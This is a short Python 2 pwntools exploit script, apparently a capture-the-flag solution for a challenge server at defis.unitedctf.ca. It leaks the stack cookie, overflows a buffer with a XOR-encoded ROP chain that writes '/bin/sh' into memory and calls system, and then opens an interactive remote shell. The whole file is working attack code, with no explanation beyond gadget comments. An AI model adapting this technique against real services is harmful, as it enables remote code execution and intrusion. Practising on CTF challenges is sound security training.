#!/usr/bin/env python2
from pwn import *
import time

context.log_level = "CRITICAL"

def xor(s):
    return "".join([chr(ord(b) ^ 0x04) for b in s])

def p64xor(n):
    return xor(p64(n))

# Gadgets
mov_rdi_dl = 0x0000000000566607 # movb [rdi], dl
pop_rdi = 0x0000000000421872 # pop rdi
pop_rsi = 0x000000000042159a # pop rsi
pop_rdx = 0x00000000004026c1 # pop rdx
pop_rax_rbx = 0x0000000000526fc6 # pop rax

# Other
bss = 0x00000000009bf010
system = 0x41f4e0

# Ropchain

ropchain = ""

# Write /bin/sh @ bss
for c, i in zip("/bin/sh\x00", range(20)):
    ropchain += p64xor(pop_rdi) + p64xor(bss + i)
    ropchain += p64xor(pop_rdx) + p64xor(ord(c))
    ropchain += p64xor(mov_rdi_dl)

ropchain += p64xor(pop_rdi) + p64xor(bss)
ropchain += p64xor(pop_rax_rbx) + p64xor(0) + p64xor(0)
ropchain += p64xor(system)

assert "\n" not in ropchain

data = """# coding: pwn
print(PWN'PAYLOAD')
"""

data = data.replace("PAYLOAD", "A" * 1032 + "\x00" * 8 + p64xor(0) + ropchain)
length = len(data)

r = remote("defis.unitedctf.ca", 6010)

r.recvline()
r.recvuntil("size: ")
r.sendline(str(length))

r.recvuntil("you: ")
cookie = r.recv(16).decode('hex')
cookie = xor(cookie)
data = data.replace("\x00" * 8, cookie)

r.send(data)
r.interactive()
